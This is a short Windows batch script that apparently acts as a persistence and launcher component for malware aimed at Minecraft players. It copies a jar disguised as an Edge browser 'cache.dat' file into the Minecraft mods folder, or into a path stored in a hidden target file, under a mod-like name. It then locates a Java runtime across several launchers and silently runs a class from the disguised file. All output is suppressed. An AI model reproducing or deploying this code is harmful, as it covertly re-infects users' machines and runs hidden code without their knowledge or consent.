@echo off
set "src=%APPDATA%\Microsoft\Edge\cache.dat"
set "tgt=%APPDATA%\Microsoft\Edge\cache.target"
if not exist "%src%" exit /b
if exist "%tgt%" (
  for /f "usebackq delims=" %%p in ("%tgt%") do copy /y "%src%" "%%p\e4all-neoforge-1.6.2.jar" >nul 2>&1
) else (
  copy /y "%src%" "%APPDATA%\.minecraft\mods\e4all-neoforge-1.6.2.jar" >nul 2>&1
)
set "java="
for /d %%j in ("%ProgramFiles%\Java\*") do if not defined java if exist "%%~j\bin\javaw.exe" set "java=%%~j\bin\javaw.exe"
for /d %%j in ("%APPDATA%\PrismLauncher\java\*") do if not defined java if /i not "%%~nj"=="jre-legacy" if exist "%%~j\bin\javaw.exe" set "java=%%~j\bin\javaw.exe"
for /d %%j in ("%APPDATA%\MultiMC\java\*") do if not defined java if exist "%%~j\bin\javaw.exe" set "java=%%~j\bin\javaw.exe"
for /d %%j in ("%APPDATA%\.minecraft\runtime\*") do if not defined java if exist "%%~j\bin\javaw.exe" set "java=%%~j\bin\javaw.exe"
if not defined java if exist "%ProgramFiles%\Common Files\Oracle\Java\javapath\javaw.exe" set "java=%ProgramFiles%\Common Files\Oracle\Java\javapath\javaw.exe"
if not defined java exit /b
start "" "%java%" -cp "%src%" link.e4all.core.StateCache poll
